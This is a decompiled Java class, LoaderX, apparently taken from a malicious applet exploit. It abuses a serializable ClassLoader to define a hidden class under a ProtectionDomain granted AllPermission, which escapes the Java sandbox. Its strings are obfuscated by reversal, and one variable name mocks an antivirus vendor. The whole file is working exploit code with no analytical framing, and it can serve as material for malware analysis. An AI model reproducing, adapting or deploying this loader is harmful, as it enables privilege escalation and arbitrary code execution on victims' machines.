// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.security.PermissionCollection;
import java.security.CodeSource;
import java.net.URL;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.lang.reflect.Field;
import java.security.ProtectionDomain;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

class LoaderX extends ClassLoader implements Serializable
{
    String g5b;
    String o4m;
    static long sophos_samij_ebanutij_antivirus2;
    private static final long serialVersionUID;
    String zi4;
    String u4k;
    public static LoaderX instance;
    
    static {
        LoaderX.sophos_samij_ebanutij_antivirus2 = Long.parseLong("BD1698CFBB8813B", 16) * 2L * (long)Math.sqrt(16.0);
        serialVersionUID = LoaderX.sophos_samij_ebanutij_antivirus2;
        LoaderX.instance = null;
    }
    
    public LoaderX() {
        final String ss = "ovtsdalB.s.ved";
        this.u4k = new StringBuilder(ss).reverse().toString();
    }
    
    private void writeObject(final ObjectOutputStream objectoutputstream) throws IOException, ClassNotFoundException {
        final String s = "";
        objectoutputstream.defaultWriteObject();
        final String s2 = "";
    }
    
    private void readObject(final ObjectInputStream objectinputstream) throws IOException, ClassNotFoundException {
        LoaderX.instance = this;
        objectinputstream.defaultReadObject();
    }
    
    public void lalafa(final String s, final String s1) throws IOException {
        final Object obj = null;
        try {
            final String s2 = "dfb";
            final String s3 = "s.ved";
            final String s4 = "zi4";
            final String s5 = "ssalc.ovtsdalB/s/ved/";
            final String ss = "ovtsdalB.s.ved";
            final String u4k = new StringBuilder(ss).reverse().toString();
            final String s6 = "mq4";
            final String s7 = "///:elif";
            final String s8 = "i4m";
            final String s9 = "atad";
            final String s10 = "oe8";
            final String s11 = new StringBuffer(s3).reverse().toString();
            final String s12 = new StringBuffer(s5).reverse().toString();
            final String s13 = new StringBuffer(s7).reverse().toString();
            final String s14 = new StringBuffer(s9).reverse().toString();
            final ByteArrayOutputStream bytearrayoutputstream = new ByteArrayOutputStream();
            byte[] abyte0 = new byte[8192];
            final String s15 = s11;
            final InputStream inputstream = (InputStream)Bladstvo.function(this.getClass(), "getResourceAsStream", new Object[] { s12 });
            int i;
            while ((i = inputstream.read(abyte0)) > 0) {
                bytearrayoutputstream.write(abyte0, 0, i);
            }
            abyte0 = bytearrayoutputstream.toByteArray();
            final Class class1 = this.defineClass(u4k, abyte0, 0, abyte0.length, (ProtectionDomain)get_pd(s13));
            if (class1 != null) {
                final Field field = class1.getField(s14);
                final Field field2 = class1.getField("cc");
                Object obj2 = Bladstvo.function(class1, "newInstance");
                field.set(obj2, s);
                field2.set(obj2, s1);
                obj2 = Bladstvo.function(class1, "newInstance");
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }
    
    public static Object get_pd(final String s13) {
        try {
            final Permissions permissions = (Permissions)Bladstvo.con(Permissions.class.getName(), new Object[0], new Class[0]);
            permissions.add(new AllPermission());
            final URL aaa = (URL)Bladstvo.con(URL.class.getName(), new Object[] { s13 }, new Class[] { String.class });
            final Object cs = Bladstvo.con("java.security.CodeSource", new Object[] { aaa, null }, new Class[] { URL.class, Class.forName("[Ljava.security.cert.Certificate;") });
            final ProtectionDomain pd = new ProtectionDomain((CodeSource)cs, permissions);
            System.out.println("pd: " + pd);
            return pd;
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
